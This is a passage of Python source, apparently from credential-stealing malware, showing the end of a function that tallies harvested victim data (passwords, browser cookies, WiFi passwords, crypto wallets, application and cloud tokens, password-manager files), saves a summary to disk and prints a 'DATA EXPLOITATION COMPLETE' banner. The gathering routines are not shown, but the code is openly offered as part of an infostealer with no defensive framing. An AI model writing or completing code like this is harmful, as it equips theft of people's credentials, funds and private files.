            'collection_time': all_data['timestamp'],
            'total_items': {
                'passwords': len(all_data['passwords']),
                'sensitive_files': len(all_data['sensitive_files']),
                'browser_cookies': len(all_data['browser_data']['cookies']),
                'browser_history': len(all_data['browser_data']['history']),
                'wifi_configs': len(all_data['wifi_passwords']),
                'email_configs': len(all_data['email_configs']),
                'databases': len(all_data['databases']),
                'crypto_wallets': len(all_data['crypto_wallets']),
                'recent_documents': len(all_data['recent_documents']),
                'application_tokens': len(all_data.get('application_tokens', [])),
                'cloud_storage_configs': len(all_data.get('cloud_storage_configs', [])),
                'development_tokens': len(all_data.get('development_tokens', [])),
                'password_manager_files': len(all_data.get('password_manager_files', [])),
                'config_files': len(all_data.get('config_files', [])),
            }
        }
        
        summary_file = f"{DATA_DIR}/data_summary.json"
        with open(summary_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2)
        
        log_activity("DATA_COLLECTION", f"Data collection complete. Saved to {DATA_DIR}/")
        log_activity("DATA_COLLECTION", f"Summary: {json.dumps(summary, default=str)}")
        
        # Print summary to console (clear text)
        print("\n" + "="*60)
        print("DATA EXPLOITATION COMPLETE - CLEAR TEXT")
        print("="*60)
        print(f"Passwords: {len(all_data['passwords'])}")
        print(f"Sensitive Files: {len(all_data['sensitive_files'])}")
        print(f"Browser Cookies: {len(all_data['browser_data']['cookies'])}")
        print(f"Browser History: {len(all_data['browser_data']['history'])}")
        print(f"WiFi Passwords: {len(all_data['wifi_passwords'])}")
        print(f"Email Configs: {len(all_data['email_configs'])}")
        print(f"Databases: {len(all_data['databases'])}")
        print(f"Crypto Wallets: {len(all_data['crypto_wallets'])}")
        print(f"Recent Documents: {len(all_data['recent_documents'])}")
        print(f"Application Tokens: {len(all_data.get('application_tokens', []))}")
        print(f"Cloud Storage Configs: {len(all_data.get('cloud_storage_configs', []))}")
        print(f"Development Tokens: {len(all_data.get('development_tokens', []))}")
        print(f"Password Manager Files: {len(all_data.get('password_manager_files', []))}")
        print(f"Config Files (~/.config/): {len(all_data.get('config_files', []))}")
        print(f"\nAll data saved in CLEAR TEXT: {data_file}")
        print("="*60 + "\n")
        
        return all_data
    except Exception as e:
        log_activity("ERROR", f"Failed to save collected data: {e}")
        return None

